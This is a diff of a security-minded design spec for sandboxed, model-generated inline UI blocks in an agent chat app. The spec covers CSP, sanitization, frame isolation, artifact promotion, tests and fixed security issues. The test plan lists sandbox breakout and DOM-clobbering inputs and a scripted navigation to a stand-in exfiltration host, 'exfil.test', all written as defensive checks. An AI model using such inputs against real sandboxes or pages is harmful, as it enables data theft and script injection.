+4. title 1–200 chars, slug `ARTIFACT_SLUG_RE`, visibility private or
+   workspace, a workspace → else 400;
+5. `promotedPage(block)` (`src/core/inline-ui/promote.ts`):
+   - the markup through `sanitizeInlineUiMarkup` — `htmlparser2`, the §4.3
+     rules from the shared lists, plus refusal of the elements browsers parse
+     as raw text (`xmp`, `plaintext`, `noembed`, `noframes`); `<style>`
+     elements moved into the CSS (closing the SVG/MathML `<style>`
+     re-parsing tricks); comments dropped; written by a canonical serializer
+     (text and attributes escaped, `{` as `&#123;` so the template renderer
+     never sees a placeholder);
+   - CSS: the frame's element CSS, the markup's styles, the block's CSS, with
+     every `<` escaped;
+   - script: `PROMOTED_OCTI_SHIM` then the block's JS (when it has JS or
+     links) — the shim keeps `octi`'s shape, shows a visible notice and
+     rejects; link chips show their address, anchors scroll;
+6. the artifact (`type: html`, `network: 'none'`, metadata `savedFrom`) in
+   the request's workspace store (a space needs `write`), and its version
+   through `writeVersion` with the script on the bundler path (no string
+   concatenation of `<script>`); a taken slug → 409.
+
+A user action under the user's own session; no agent ASK.
+
+**Residual.** The artifact pages that frame an embed set no `frame-src`, so a
+saved copy's script can still navigate its own frame to another site (the
+D9 containment is the chat's host frame, which a saved copy does not have).
+What it could carry is only the page's own content: the copy has no session,
+data source, token or network, and answers made after reading outside
+content are refused.
 
 ---
 
-## 8. P4 — Streaming preview (conditional)
+## 8. P4 — Streaming preview
 
-**Precondition.** Measure per provider whether tool arguments arrive in more
-than one chunk (hosted Anthropic, OpenAI, OpenRouter; Ollama; Gemini; the
-LiteLLM proxy). Build P4 only if the providers used by the eval models stream
-them; otherwise revisit §14-Q1.
-
-**Server**
-- `streamInput?` on `ToolHandler`, set on `render`.
-- `collectStream` gains `onToolCallDelta(key, name, fragment)`
-  (`stream-collect.ts:41-51`).
-- The worker forwards fragments only when `name` is an offered root handler
-  with `streamInput` **and**, checked on every emit, the session label has no
-  `secret`; one emit per 150 ms per call:
-  `thought { type: 'tool_input_delta', toolCallId, name, delta, iteration }`.
-- `event-bridge.ts` → gateway event `chat.tool_input_delta` (literal `type:`
-  at the publish site for the catalog); `agent-manager.ts:377` treats it like
-  `text_delta`; `event-bus.ts:25` adds it to `UNRECORDED_TYPES`. Federation
-  drops it (`src/core/federation/virtual-connection.ts:69`).
-
-**Client**
-- `src/shared/inline-ui/partial-args.ts` extracts `title`, `css`, `html`,
-  tolerating any key order and fragments that split an escape; never `js`.
-- Preview = the P1 frames in static mode. The chat page sends `update { css,
-  html }` to the host at most every 300 ms; the host checks
-  `event.source === parent` (cached) and the correlation id, then forwards to
-  the content runtime, which re-sanitizes exactly as in D6. The runtime
-  sources change in P4 (the hash pinned in tests is updated).
-- Previews are keyed `(agentId, iteration, toolCallId)` and destroyed on
-  `tool_call_complete` of any status, on that call's `observation`, on the
-  agent's terminal status, or after 30 s without deltas. The final block
-  always mounts from the stored source.
-- Old clients ignore the unknown event (`page.tsx:1039`).
+Built on the text stream (D13), not on tool arguments. While a reply streams
+(`chat.delta`), `StreamingContent` finds an open `octi-ui` fence, shows the
+prose around it, and renders `InlineUiPreview`: the frames in static mode
+(`preview: true` — no JS ever), first with the content so far, then
+`update { html, css }` messages at most every 300 ms. The host accepts
+`update` only from its parent with the mount's channel and passes it to the
+content runtime, which sanitizes exactly as for a stored block. The preview
+is labelled "Building “T”…"; the final reply mounts from the stored source.
 
 ---
 
 ## 9. Guidance
 
-### 9.1 `render` description (≈ 600 tokens)
-
-1. When: a control, a calculation, a stepper, or a chart of given or
-   retrieved numbers helps more than text. At most one per answer unless
-   asked.
-2. When not: prose, code, lists, a single value, a table (markdown),
-   anything to keep, share or refresh (artifacts).
-3. Contract: `title`, `css`, `html`, `js` (best-effort order: styled first
-   paint); target under 12 KB; limits; no network, storage, forms, remote
-   images, file or password inputs, or inline `on*` handlers — use
-   `addEventListener` in `js`; links become chips the user clicks.
-4. Quality: labelled inputs, keyboard access, `role="status"` for results;
-   validate numbers (`valueAsNumber`, `Number.isFinite`, bounds, no division
-   by zero, never show NaN); label sample vs user vs retrieved vs calculated
-   values; render untrusted strings with `textContent`.
-5. Theme tokens `--octi-*`; width 100%, `min-width: 0`, wrap at phone width.
-6. `octi.openLink(url)` (from P2 `octi.prompt(text)`) only from a click handler.
-7. `inline-ui__guide` has SVG chart and diagram recipes.
-
-### 9.2 `src/tools/inline-ui/guide.md` (≈ 2 000 tokens, v1 in P1)
-
-Adapted from OIUI's `master-playbook`, `advanced-visualization` and
-`svg-diagrams` (MIT, attribution in the header): SVG bar/line chart recipe
-with axes, labels and a text alternative; SVG diagram template (boxes,
-arrows, `marker`, `viewBox`); canvas sizing with `ResizeObserver`; reduced
-motion; accessible stepper and slider; numeric validation examples.
+The contract lives in `INLINE_UI_PROMPT` (§5.4), in the root prompt's
+cacheable part on offered turns: when and when not; the format with title
+and height; limits and "aim for under 12 KB"; no network, storage, forms,
+iframes, password or file inputs, or inline handlers (`addEventListener`,
+`<button type="button">`); links and `octi.prompt` / `octi.openLink` only
+from click handlers; quality (labels, keyboard access, `role="status"`,
+numeric validation, no NaN, label sample/user/retrieved/calculated values,
+`textContent` for untrusted text); dark theme tokens and phone width; one
+sentence of context; markers and `inline-ui__source`. OIUI's recipe
+playbooks (SVG charts, diagrams) are not included yet (§14-8).
 
 ---
 
@@ -909,147 +730,142 @@ motion; accessible stepper and slider; numeric validation examples.
 
 ### 10.1 Cost
 
-- Render: 12 KB ≈ 3.5 k output tokens; 36 KB ≈ 10 k; counted by existing
-  budgets (`agent-worker.ts:1117-1124,1380-1387`).
-- Within the turn, arguments are re-sent on later iterations (at most
-  4 × 36 KB). On later turns only the stub (D12).
-- `guide`: one extra iteration when used.
-- Schema: three handlers ≈ 900 tokens on offered turns.
-- The volatile prompt line is stored on every offered turn's user row and
-  re-sent with history (≈ 40 tokens per turn).
-- Measured with `src/core/agent/prompt-budget.ts`; reported in the P1 PR.
+- Prompt section ≈ 550 tokens on offered turns, in the cached prefix.
+- A block costs its output tokens once (12 KB ≈ 3.5 k tokens); later turns
+  carry only the marker line. A repair round costs one more completion.
+- `inline-ui__source` costs one extra iteration when used.
 
 ### 10.2 Privacy and storage
 
-Session content; deleted with the session (cascade) and by idle-session
-cleanup; not indexed, shared or sent to other users. Backups need nothing new
-(`pg_dump`). Bounded at 200 × 36 KB per session.
+Session content: deleted with the session (cascade); not indexed. A block
+in a room is readable by the room's members, as its messages are. Bounded at
+200 × 36 KB per session.
 
 ### 10.3 Accessibility
 
 Frame `title`; heading in the header; skip link; script errors, stops and
 suggestions announced with `role="status"`; focus moves only on a click, or
-back to where it was (S14); accessible markup is the default in the
-description and checked by the eval.
+back to where it was (S14); accessible markup is the default in the prompt.
 
 ### 10.4 Operations
 
-- **Kill switch:** a stored DENY on tool `inline-ui`, per user or global,
-  makes the offer false; nothing is advertised and nothing fails at call
-  time. No flag (house rule 9).
-- **Metrics:** `octipus_tool_executions_total{tool,status}`
-  (`docs/OBSERVABILITY.md:53`).
-- **Logs:** one info line per render (§5.2).
-- **Client outcomes:** shown in the block and sent with the next message
-  (§5.6); not collected as telemetry.
+- **Kill switch:** a stored DENY on tool `inline-ui` action `render`, per
+  user or global, makes the offer false.
+- **Logs:** §5.2, and "Interactive answer needs repair — asking the model
+  once".
+- **Client outcomes:** shown in the block and sent with the next message;
+  not collected as telemetry.
 
 ### 10.5 Compatibility
 
 | Case | Behaviour |
 |---|---|
-| Old web, new server | Does not declare `renders` → never offered |
-| New web, old server | Listing 404 → no blocks; `renders`, `inlineUiReports`, `provenance` stripped by the non-strict `ChatSendSchema` |
+| Old web, new server | Does not declare `renders` → not offered in chats; a room reply's markers show as plain lines |
+| New web, old server | `renders` and `inlineUi` stripped by the non-strict schema; nothing offered |
 | REST fallback | Not offered (D14) |
-| TUI | Not offered; shows "open in the web app" for blocks from the web |
-| Channels, MCP, eval | Not offered unless declared |
-| CLI-provider root (Claude Code CLI, Codex) | Not offered (D4) |
-| Federation peers | No events forwarded |
-
-### 10.6 Docs
-
-New `docs/INLINE-UI.md` (users, contributors, operations, kill switch).
-Updates: `docs/FLOW-GUARD.md`, `docs/TOOL-ROUTING.md:45`,
-`docs/AGENT-ARCHITECTURE.md:266`, `docs/ARTIFACTS.md`, `docs/OBSERVABILITY.md`,
-`docs/DESKTOP.md` (S13), `docs/OPENCLAW-COMPARISON.md:110,149`,
-`docs/DEVELOPMENT.md:80-82` and `AGENT.md:207-208`, `CHANGELOG.md`; README
-"New in" when shipped.
-
-### 10.7 Catalog
-
-New routes, the P4 event and new module edges change
-`docs/architecture/generated/CATALOG.md`; `npm run catalog` in each PR that
-adds them (CI: `.github/workflows/ci.yml:64`).
+| TUI, channels, MCP, voice, OpenAI-compatible API | Fallback line (§5.6) |
+| CLI-provider root | Not offered (D4) |
+| Federation | Remote rooms fetch blocks through `room.inline_ui` |
 
 ---
 
-## 11. Test plan
+## 11. Tests
 
-| Area | Test | Lane |
+| Area | Tests | Lane |
 |---|---|---|
-| Spike | §5.0 | Playwright (3 engines) + manual desktop |
-| Lint and limits | every §4.3 row; limits at ±1; JSON-size limit; esbuild check; `{{secret:` | unit `src/shared/inline-ui/*.test.ts`, `src/tools/inline-ui/*.test.ts` |
-| Document builders | payload escape of `<`, U+2028/2029; CSP first in head; constant runtime sources (hash pinned); content CSP allowances ⊆ host CSP allowances | unit (string) + Playwright (`document.head.firstElementChild` is the CSP meta; exactly one CSP meta) |
-| Breakouts | `</style>` + `<link rel=dns-prefetch>` in css; `</script>`, `<!--<script>` in js; `<plaintext>`, `<textarea>`, `<title>`, unclosed `<!--`, meta refresh, nested `<template>`, `shadowrootmode` in html | Playwright: runtime intact, no request, `ready` received |
-| Clobbering | `<img name="getElementById">`, `<img name="body">`, `<form name="querySelector">` | Playwright: runtime works, link handling intact |
-| Links | no live `href` after insertion; click/Enter/Space → chip; middle-click and pointerdown cause no request; SVG `set`/`animate` href refused; MathML href removed | Playwright with request recording |
-| S1–S3 | frame cannot read `parent.document`, `localStorage`, `document.cookie`; `fetch`, remote img/font/`@import` blocked; `window.open`, form submit, `top.location`, `alert`, `navigator.clipboard`, `execCommand('copy')` fail; no popup; `featurePolicy.allowedFeatures()` empty | Playwright, with a per-test allow-list of expected console messages |
-| S4 / D9 | scripted `location=` to routed `https://exfil.test/**` with 200, 204 and a hanging body: no request (spike branch) or block stopped and ASK applied (fallback) | Playwright |
-| S5 | messages from the content frame or another frame to the chat page ignored; content cannot forge `stopped`; flood unmounts | Playwright |
-| S6 / P2 | strip shows full text; buttons inert for 800 ms; frame height locked while open; nothing sent without a click in the chat page; Edit appends to an existing draft | Playwright |
-| Lint ≡ sanitizer | one shared fixture of refused inputs; the server lint and the content runtime refuse/remove exactly the same set | unit + Playwright |
-| T6 caps | 201 `<use>`, `<use>` depth 4, 21 filters are cut back by the runtime | Playwright |
-| S12 | footer and spacer present; password/file inputs replaced; height clamp | Playwright |
-| S14 | programmatic `focus()` in a frame while typing in the composer returns focus and stops the block | Playwright |
-| D10 | history scripted block waits; tainted live block waits; impersonation waits; freeze marker → "froze" | Playwright |
-| Offer | root × audience × renders × small × denied × CLI provider; customized role row's handlers filtered | unit |
-| D14 plumbing | `chat.send` schema, `RunContext.renders`, REST fallback offers nothing | unit |
-| Tool | conformance; stores and returns meta; `get` session-scoped; caps; D4 check from a child and from codemode; truncation messages | unit + database |
-| History | `stubInlineUiHistory`: success, failure, `get` results, `providerRaw` dropped; snapshot size bounded after N renders; `promptContext` note with ids only | unit + database; live check on Anthropic, Gemini, one OpenAI-compatible provider |
-| Reports and provenance | enum-only schema; ids must belong to the session; steer path; dropped with warn when the turn does not reach the root | unit + database |
-| Flow guard | spike branch vs fallback classification; vault placeholder refused, no exemption; approval payload is a summary | unit |
-| REST | isolation (two users, deactivated, impersonating); `no-store`; envelope; `clearedAt` | database `inline-ui.isolation.test.ts` |
-| Web rendering | from stub `tool_call_complete` + stubbed REST (`stubSessions` gains `**/api/sessions/*/inline-ui → { blocks: [] }`); reload; ordering before the reply with skewed clocks; unmount at the cap; TUI `inline_ui` summary; old-server 404 | Playwright `tests/web/inline-ui.spec.ts`; unit for TUI |
-| SPA CSP pin | SPA serves no CSP that would break the nonces | unit on `web/serve.mjs` |
-| S13 desktop | `set_backend_url` from a content frame refused on three webviews | manual, recorded in the P1 PR |
-| P1a | `toolName` on rows; `toolsUsed` boundary; not-evaluable in unit mode | unit + database |
-| Promotion | bundle built via bundler; `network='none'` CSP; shim message; tainted refused; visibility limited | database + Playwright |
-| Preview (P4) | keys; teardown paths; not persisted, not replayed; not forwarded for unoffered names or `secret`; `update` from a sibling frame ignored; no remote load or navigation | unit + Playwright |
-| Evals | §5.10 | `npm run eval` |
+| Fences, markers, fallbacks, lint, limits, document builders, CSP subset, bridge validation | `src/shared/inline-ui/inline-ui.test.ts` | unit |
+| Offer matrix | `src/core/inline-ui/offer.test.ts` | unit |
+| Extraction, caps, notices, flow label, idempotence, access (owner, admin, member, stranger, room, wrong session), `no-store`, turn notes, source tool, promotion (bundle after shim, closed CSP, tainted, visibility, ownership, slug) | `src/api/routes/inline-ui.isolation.test.ts` | database |
+| Repair round (draft kept, once only, not offered / child) | `src/core/agent-worker.inline-ui.test.ts` | unit |
+| Server sanitizer (refusals from the shared lists, raw-text elements, SVG/MathML `<style>`, links, escaping, cost caps), promoted page | `src/core/inline-ui/promote.test.ts` | unit |
+| Frames in a browser: spike, inheritance, navigation (200/204), forged signals, floods, breakouts, clobbering, links, caps | `tests/web/inline-ui-frames.spec.ts` | Playwright (Chromium) |
+| Chat: history waits, live runs, suggestion strip with provenance, reports, link chip, streaming preview, not available, focus guard, save dialog, tainted save disabled | `tests/web/inline-ui.spec.ts` | Playwright |
+| Saved copy: script after the shim, opaque origin when opened directly, notices, no request | `tests/web/inline-ui-saved.spec.ts` | Playwright |
+| Rooms: every member sees a block, scripts wait, a suggestion posts addressed | `tests/web/rooms.spec.ts` | Playwright |
+| Eval harness: unobserved tool use, renders blocker, loader escapes, suite loads | `src/eval/*.test.ts` | unit |
+| Embed sandbox header, closed CSP; REST versions keep bundles; 409 slug | `src/core/artifacts/csp.test.ts`, `src/api/routes/artifact-versions.isolation.test.ts` | unit, database |
+| OAuth callback pages | `src/api/popup-callback.isolation.test.ts` | database |
 
 ---
 
-## 12. Delivery
+## 12. Delivery and what is open
 
-One phase per PR; refactors and pre-existing fixes are their own PRs.
+Shipped on one branch, in four commits: the server, the web, the
+pre-existing fixes (§13), and P3 with the docs and this revision.
 
-| PR | Contents | Done when |
-|---|---|---|
-| Spike | §5.0 | results recorded; D9 branch chosen |
-| P1a | Eval harness (§5.9) | tests green; re-baselined suites reported |
-| P1 | §5.1–5.8, guide v1, docs | `typecheck`, `lint`, `test`, `test:web`, `catalog:check`, web `tsc` green; P1 rows of §11; eval gate recorded; history live check on three providers; S13 on three webviews; schema token cost reported |
-| P2 | §6 | its §11 rows; eval re-run shows no drop |
-| §13-1 fix | embed CSP `sandbox` | artifact tests green |
-| P3-refactor | §7 prerequisite 2–3 | no behaviour change; tests green |
-| P3 | §7 | its §11 rows |
-| P4 | §8, only if its precondition holds | provider measurements recorded |
+Open:
+1. **Eval gate** (§5.9) with live models — needs provider access.
+2. **Firefox and WebKit** navigation containment (D9). Until verified,
+   scripted blocks wait for a click there.
+3. **Desktop webviews** (WebKitGTK, WKWebView, WebView2): run the frames and
+   check that `set_backend_url` is refused from a content frame (S13). The
+   build script and capability file were verified to generate and validate.
+4. **Recipes** for charts and diagrams (§9) if the eval shows weak visuals.
 
 ---
 
-## 13. Pre-existing issues found in review (not fixed by this spec, except 1 and 4)
+## 13. Pre-existing issues found in review and implementation
 
-1. **Embed CSP has no `sandbox` directive** (`src/api/routes/artifact-pages.ts:300-303`); in path-prefix mode (`src/core/artifacts/host.ts:15-19`) opening `/__artifacts__/…/embed` at top level runs the bundle with the app origin. Fix: `sandbox allow-scripts`. Required before P3.
-2. **OAuth popup listener has no origin check** (`web/components/settings/oauth-section.tsx:82-84`).
-3. **Stale docs:** `AGENT.md:207-208` and `docs/DEVELOPMENT.md:80-82` say tools are auto-discovered.
-4. **`uses_tool` can never pass** (`src/eval/runner.ts:75,239`). Fixed by P1a.
-5. **REST artifact create stores inline scripts without bundling them** (`src/api/routes/artifacts.ts:84-92`); behaviour silently lost. Bundling them changes what REST callers can run and needs its own threat note.
-6. **Stale comment:** lazy discovery is described as Ollama-only (`src/core/agent/roles/general/config.ts:12-18`), but it is on for every provider (`src/core/agent/lazy-tools.ts:44-48`).
-7. **REST fallback turns are unattended** (no `channel`, `page.tsx:1684`): approvals in a fallback turn are blocked rather than asked. Likely intended, since the tab cannot hear the gateway; worth documenting.
-8. **Tauri app commands are not governed by capabilities** (`web/src-tauri/build.rs` has no `AppManifest`). Any webview content in the main window can call `set_backend_url`. Fixed by S13; worth fixing regardless.
+All fixed on this branch.
+
+1. **Embed CSP had no `sandbox` directive** — an embed opened directly in
+   path-prefix mode ran with the app's origin. The header now carries
+   `sandbox allow-scripts` (`embedCspHeader`).
+2. **OAuth popup listener had no origin check** — it now accepts only its
+   own popup at the app's origin.
+3. **Stale docs** — tools, channels and MCP groups are registered in lists
+   (`AGENT.md`, `docs/DEVELOPMENT.md`).
+4. **`uses_tool` could never pass** — §5.8.
+5. **REST artifact writes lost behaviour** — create, edit and restore use the
+   version writer: scripts are bundled, CSS-only edits keep the bundle,
+   restores copy it, viewers are notified. Threat note in
+   `version-writer.ts`: REST callers can run nothing the agent tool does not
+   already run for them, and only inside the sandboxed embed.
+6. **Stale comment** — lazy discovery is not Ollama-only.
+7. **REST fallback turns are unattended** — documented in the chat page and
+   `docs/API.md`.
+8. **Tauri app commands were not governed by capabilities** — `AppManifest`
+   with both commands, granted to the main window; the unused `store:default`
+   permission (which let page script write the backend URL past
+   `set_backend_url`'s checks) removed.
+
+Found while implementing:
+
+9. **OAuth callback pages reflected script.** The connector callback put
+   `?error=` into an inline script with `JSON.stringify` under
+   `'unsafe-inline'`; the provider callback likewise. The global CSP
+   replaced the page's policy — which also blocked the pages' own scripts,
+   so popups never reported back. One builder now: script-safe JSON, escaped
+   markup, a nonce policy the global headers keep (`src/api/popup-callback.ts`).
+10. **A taken artifact slug answered 500** (REST) or a raw SQL error (tool):
+    Drizzle wraps the driver error, so the constraint is on `cause`
+    (`src/db/unique-violation.ts`).
+11. **Eval YAML double-quoted strings were not unescaped**, so a suite's
+    regex `"\\*\\*[1-9]"` matched any digit.
+12. **Phantom dependencies** — `htmlparser2`, `domhandler`, `domutils` were
+    imported but installed only through `botbuilder`.
+13. **`docs/ARTIFACTS.md` described bundles as a future endpoint** with
+    hash pinning; rewritten. The biome schema version now matches the
+    pinned CLI.
 
 ---
 
 ## 14. Open questions
 
-1. **Fenced block instead of a tool call (D13).** Would stream on every
-   provider and avoid HTML inside JSON; needs extraction on message and
-   snapshot paths, stripping on non-web clients, and flow-label checks at
-   extraction. Decide after the P4 measurement.
-2. **Rooms, spaces, group threads.** Proposal: static only, no bridge.
+1. ~~Fenced block instead of a tool call~~ — chosen (D13).
+2. ~~Rooms, spaces, group threads~~ — rooms and members' space chats are
+   supported, rooms with click-to-run; group threads get the fallback line.
 3. **Children.** Return data for the root to render, or render themselves?
+   Today only the root writes blocks; a child's fence that reaches the reply
+   is extracted like the root's.
 4. **Libraries.** Vendor one chart library from the app origin with a
    path-scoped `script-src`, if evals show SVG charts are too costly or poor.
-5. **Lite tier.** Keep or drop per the eval.
-6. **Light theme.** The frames already take a theme parameter.
+5. **Lite tier.** Offered (only small-tier is excluded); keep or drop per the
+   eval.
+6. **Light theme.** The frames take a theme parameter; the app is dark-only.
+   Saved copies follow the viewer's `prefers-color-scheme`.
+7. **Other engines** — §12-2.
+8. **Recipes** — §12-4.
 
 ---
 
@@ -1057,17 +873,32 @@ One phase per PR; refactors and pre-existing fixes are their own PRs.
 
 | OIUI | Here | Change |
 |---|---|---|
-| `generateSandboxedUi`, order `initialHeight → placeholderMessages → css → html → jsFunctions → jsExpressions` | `title → height_hint → css → html → js`, best-effort | one js field, no placeholders |
-| `process-partial-html.ts` | not used | the runtime sanitizes parsed DOM (D6) |
+| `generateSandboxedUi` tool, args `initialHeight → placeholderMessages → css → html → jsFunctions → jsExpressions` | an `octi-ui` fence in the reply: `title`, `height`, `<style>`, markup, `<script>` | text, not a tool call (D13); one script |
+| `process-partial-html.ts` | not used | the runtime sanitizes parsed DOM (D6); the preview streams from text (§8) |
 | Websandbox + Idiomorph, one frame | two constant frames, `innerHTML` swap | no dependency; trusted host outside generated code's realm |
 | CSP with 4 CDNs and `'unsafe-eval'`, inline handlers | nonce-only, no network, no eval, no inline handlers | D7, §4.2 |
 | `sendPrompt` sends immediately | chat-page suggestion strip | D8 |
 | `openLink` opens immediately | link chip | D8 |
-| Jev router | description + eval gate | non-goal |
-| Skills in the system prompt | contract in the description; recipes behind `guide` | §9 |
+| Jev router | prompt section + eval suite | non-goal |
+| Skills in the system prompt | the contract in a prompt section on offered turns | §9 |
 | `ResizeObserver` + polling | `ResizeObserver`, coalesced, clamped | — |
 
+---
+
 ## Appendix B — Revision log
+
+**Revision 4** (as built):
+- **Format (D1, D13).** A fenced `octi-ui` block in the final reply instead of the `inline-ui__render` tool call; stored at the end of the run and replaced by a marker line (D2); placement is the marker's place in the reply (D3), so no timeline kind and no envelope clock.
+- **Audiences (D4).** Rooms always (scripts wait for a click), members' space chats with `renders`; group threads and remote-space sessions never.
+- **G3 (D12).** One repair round in the turn replaces tool errors; extraction runs before any copy of the reply is kept; earlier-iteration fences are stubbed and `providerRaw` dropped.
+- **Spike (D9).** Chromium: host `frame-src 'none'` blocks the content frame's navigation (200 and 204) and still allows the `srcdoc` child. Firefox and WebKit not run: click-to-run there. No write-egress classification: the flow label is recorded on the block (`tainted`, `risk`).
+- **Frames (D6).** No `allow` attribute (console noise; the opaque origin already withholds `self`-default features); `querySelectorAll` walk with `template` refused.
+- **Tools.** Only `inline-ui__source`; the contract is a prompt section, not a tool description; `inline-ui__guide` dropped (recipes open, §14-8).
+- **Preview (§8).** From the streamed text, not tool arguments; no new gateway event.
+- **Focus guard (S14).** A theft is a page keystroke within one second or no user activation; Tab exempt (pointer events inside a frame never reach the page).
+- **Promotion (§7).** Server sanitizer on `htmlparser2` sharing the runtime's lists, canonical serializer, `octi` shim in the bundle, `network = 'none'` embed without SDK or token.
+- **Eval harness.** `renders` blocker in unit mode; loader escapes; `eval/inline-ui.yaml`.
+- **§13.** All eight pre-existing issues fixed; five more found and fixed.
 
 **Revision 3.1** (round 3: 1 blocker, 3 majors, 3 minors):
 - **CSP inheritance.** The content frame inherits the host CSP. The host CSP now allows everything the content CSP allows, a subset test was added, and the spike tests inheritance and `data:` frames (§4.2, §5.0).
